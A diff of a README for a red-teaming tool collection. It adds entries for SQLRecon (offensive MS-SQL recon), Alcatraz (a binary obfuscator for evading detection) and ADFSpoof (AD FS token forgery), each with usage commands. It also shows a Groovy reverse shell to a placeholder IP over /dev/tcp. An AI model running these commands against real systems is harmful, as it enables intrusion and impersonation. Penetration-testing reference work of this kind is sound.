@@ -4,7 +4,7 @@
 <img src="https://user-images.githubusercontent.com/100603074/210680426-20a92131-56f9-43ad-be82-f449e3215dda.png" height="300">
 </p>
 
-This github repository contains a collection of **75+** **tools** and **resources** that can be useful for **red teaming activities**. 
+This github repository contains a collection of **85+** **tools** and **resources** that can be useful for **red teaming activities**. 
 
 Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.
 
@@ -75,7 +75,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Execution</b> $\textcolor{gray}{\text{8 tools}}$</summary>
+    <summary><b>Execution</b> $\textcolor{gray}{\text{9 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#responder">Responder</a></b><i> LLMNR, NBT-NS and MDNS poisoner</i></li>
@@ -86,6 +86,7 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#powersploit">PowerSploit</a></b><i> PowerShell script suite</i></li>
             <li><b><a href="#rubeus">Rubeus</a></b><i> Active directory hack tool</i></li>
             <li><b><a href="#sharpup">SharpUp</a></b><i> Windows vulnerability identifier</i></li>
+            <li><b><a href="#sqlrecon">SQLRecon</a></b><i> Offensive MS-SQL toolkit</i></li>
         </ul>
     </ul>
 </details>
@@ -118,12 +119,13 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{3 tools}}$</summary>
+    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{4 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#invoke-obfuscation">Invoke-Obfuscation</a></b><i> Script obfuscator</i></li>
-	        <li><b><a href="#veil">Veil</a></b><i> Metasploit payload obfuscator</i></li>
+	    <li><b><a href="#veil">Veil</a></b><i> Metasploit payload obfuscator</i></li>
             <li><b><a href="#sharpblock">SharpBlock</a></b><i> EDR bypass via entry point execution prevention</i></li>
+            <li><b><a href="#alcatraz">Alcatraz</a></b><i> GUI x64 binary obfuscator</i></li>
         </ul>
     </ul>
 </details>
@@ -156,7 +158,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{9 tools}}$</summary>
+    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{10 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#crackmapexec">crackmapexec</a></b><i> Windows/Active directory lateral movement toolkit</i></li>
@@ -168,6 +170,7 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#upgrading-shell-to-meterpreter">Upgrading shell to meterpreter</a></b><i> Reverse shell improvement</i></li>
             <li><b><a href="#forwarding-ports">Forwarding Ports</a></b><i> Local port forward command</i></li>
             <li><b><a href="#jenkins-reverse-shell">Jenkins reverse shell</a></b><i> Jenkins shell command</i></li>
+            <li><b><a href="#adfspoof">ADFSpoof</a></b><i> Forge AD FS security tokens</i></li>
         </ul>
     </ul>
 </details>
@@ -1240,6 +1243,46 @@ SharpUp.exe audit HijackablePaths
 
 ![image](https://user-images.githubusercontent.com/100603074/210079939-e709cced-04a2-44a5-9da0-f387bc6599b1.png)
 
+### [🔙](#tool-list)[SQLRecon](https://github.com/skahwah/SQLRecon)
+
+MS-SQL (Microsoft SQL Server) is a relational database management system developed and marketed by Microsoft.
+
+This C# MS-SQL toolkit is designed for offensive reconnaissance and post-exploitation. For detailed usage information on each technique, refer to the [wiki](https://github.com/skahwah/SQLRecon/wiki).
+
+**Install: (Binary)** 
+
+You can download the latest binary release from [here](https://github.com/skahwah/SQLRecon/releases).
+
+**Usage:** 
+
+```bash
+# Authenticating using Windows credentials
+SQLRecon.exe -a Windows -s SQL01 -d master -m whoami
+
+# Authenticating using Local credentials
+SQLRecon.exe -a Local -s SQL02 -d master -u sa -p Password123 -m whoami
+
+# Authenticating using Azure AD credentials
+SQLRecon.exe -a azure -s azure.domain.com -d master -r domain.com -u skawa -p Password123 -m whoami
+
+# Run whoami
+SQLRecon.exe -a Windows -s SQL01 -d master -m whoami
+
+# View databases
+SQLRecon.exe -a Windows -s SQL01 -d master -m databases
+
+# View tables
+SQLRecon.exe -a Windows -s SQL01 -d master -m tables -o AdventureWorksLT2019
+```
+
+Full usage information can be found on the [wiki](https://github.com/skahwah/SQLRecon/wiki).
+
+Tool module usage information can be found [here](https://github.com/skahwah/SQLRecon#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/211530318-6e115272-a00c-4e9e-af9a-852d476ff3fb.png)
+
+*Image used from SQLRecon help page*
+
 Persistence
 ====================
 
@@ -1697,6 +1740,43 @@ Nice PenTestPartners blog post [here](https://www.pentestpartners.com/security-b
 ![image](https://user-images.githubusercontent.com/100603074/210983524-d6ea4255-7c47-45bb-8b13-9f6240735b0e.png)
 
 *Image used from https://youtu.be/0W9wkamknfM*
+
+### [🔙](#tool-list)[Alcatraz](https://github.com/weak1337/Alcatraz)
+
+Alcatraz is a GUI x64 binary obfuscator that is able to obfuscate various different pe files including:
+
+- .exe
+- .dll
+- .sys
+
+Some supported obfuscation features include:
+
+- Obfuscation of immediate moves
+- Control flow flattening
+- ADD mutation
+- Entry-point obfuscation
+- Lea obfuscation
+
+**Install: (Requirements)** 
+
+Install: https://vcpkg.io/en/getting-started.html
+
+```bash
+vcpkg.exe install asmjit:x64-windows
+vcpkg.exe install zydis:x64-windows
+```
+
+**Usage:** 
+
+Using the GUI to obfuscate a binary:
+
+1. Load a binary by clicking `file` in the top left corner.
+2. Add functions by expanding the `Functions` tree. (You can search by putting in the name in the searchbar at the top)
+3. Hit `compile` (**Note:** *Obfuscating lots of functions might take some seconds*)
+
+![image](https://user-images.githubusercontent.com/100603074/211530410-12982326-8fff-4415-bdde-2ebf6db2ae6c.png)
+
+*Image used from https://github.com/weak1337/Alcatraz*
 
 Credential Access
 ====================
@@ -2291,6 +2371,44 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+
+### [🔙](#tool-list)[ADFSpoof](https://github.com/mandiant/ADFSpoof)
+
+Created by Doug Bienstock [@doughsec](https://twitter.com/doughsec) while at Mandiant FireEye.
+
+ADFSpoof has two main functions:
+
+1. Given the EncryptedPFX blob from the AD FS configuration database and DKM decryption key from Active Directory, produce a usable key/cert pair for token signing.
+2. Given a signing key, produce a signed security token that can be used to access a federated application.
+
+This tool is meant to be used in conjunction with ADFSDump. ADFSDump runs on an AD FS server and outputs important information that you will need to use ADFSpoof.
+
+**Install:** 
+
+**Note:** *ADFSpoof requires the installation of a custom fork of the Python Cryptography package, available [here](https://github.com/dmb2168/cryptography).*
+
+```bash
+git clone https://github.com/mandiant/ADFSpoof
+pip install -r requirements.txt
+```
+
+**Usage:** 
+
+```bash
+# Decrypt the EncryptedPFX and write to disk
+python ADFSpoof.py -b EncryptedPfx.bin DKMkey.bin dump
+
+# Generate a security token for Office365
+python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s sts.doughcorp.com o365 --upn robin@doughcorp.co --objectguid {1C1D4BA4-B513-XXX-XXX-3308B907D759
+```
+
+Full usage information can be found [here](https://github.com/mandiant/ADFSpoof#usage).
+
+Additional command examples can be found [here](https://github.com/mandiant/ADFSpoof#examples).
+
+![image](https://user-images.githubusercontent.com/100603074/211530527-02e63fe3-5dda-4a81-8895-c140aec4eeca.png)
+
+*Image used from https://github.com/mandiant/ADFSpoof#usage*
 
 Collection
 ====================
